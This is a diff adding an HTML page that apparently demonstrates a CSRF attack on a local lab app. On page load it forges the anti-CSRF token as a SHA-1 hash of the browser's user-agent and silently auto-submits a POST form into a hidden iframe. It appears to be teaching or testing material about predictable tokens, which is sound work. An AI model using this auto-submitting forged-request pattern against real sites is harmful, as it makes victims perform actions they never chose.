@@ -1,0 +1,31 @@
+<html>
+<header>
+<script src="http://crypto-js.googlecode.com/svn/tags/3.1.2/build/rollups/sha1.js"></script>
+</header>
+<body onload="foo();" >
+
+<iframe name="iframe"></iframe>
+
+<form name="frmCSRF" method="POST" action="http://localhost/advanced-csrf/leaking/index.php" target="iframe">
+	<input type="text" name="token" id="token" value="" />
+	<textarea name="msg" cols="15" rows="5">harharhar</textarea>
+
+	<input type="submit" value="Leak it!" />
+</form>
+
+
+<script type="text/javascript">
+function foo() {
+var token = navigator.userAgent;
+//document.writeln(navigator.userAgent);
+
+var hash = CryptoJS.SHA1(token);
+
+document.getElementById('token').value = hash;
+//alert(token);
+
+document.frmCSRF.submit();
+}
+</script>
+</body>
+</html>
